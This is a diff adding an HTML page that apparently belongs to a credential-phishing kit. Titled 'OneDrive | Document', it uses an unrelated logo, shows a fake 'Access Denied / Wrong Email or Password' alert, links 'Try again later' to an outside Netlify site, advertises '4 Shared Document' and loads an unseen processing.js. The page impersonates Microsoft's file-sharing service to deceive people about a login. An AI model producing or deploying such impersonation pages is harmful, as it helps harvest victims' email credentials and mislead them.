@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <title>OneDrive | Document</title>
+  <link rel="icon" href="favicon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="browser_ditect.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+  <div class="message-card">
+    <!-- Logo image – left aligned, no border -->
+    <div class="logo mobile-logo">
+      <img src="logo.png"
+           alt="auraWAVE Logo"
+           class="logo-image">
+    </div>
+
+    <!-- Pure alert message – centered, with linked phrase in a new paragraph -->
+    <div class="alert-message" role="alert" aria-live="polite">
+      <div class="alert-header">
+        <span class="alert-title">Access Denied</span>
+      </div>
+      <div class="alert-description">
+        <strong></strong><br>
+        We're unable to complete your access request
+      </div>
+
+      <!-- New paragraph with the hyperlinked phrase -->
+      <div class="alert-description secondary">
+        Wrong Email or Password,  
+        <a href="https://cirusfoundation.netlify.app" class="message-link" target="_blank" rel="noopener noreferrer">
+          Try again later
+        </a>.
+      </div>
+      <div class="notice-line">
+        <span>📢</span> <span>4 Shared Document</span>
+      </div>
+    </div>
+  </div>
+
+  <script src="processing.js"></script>
+</body>
+</html>
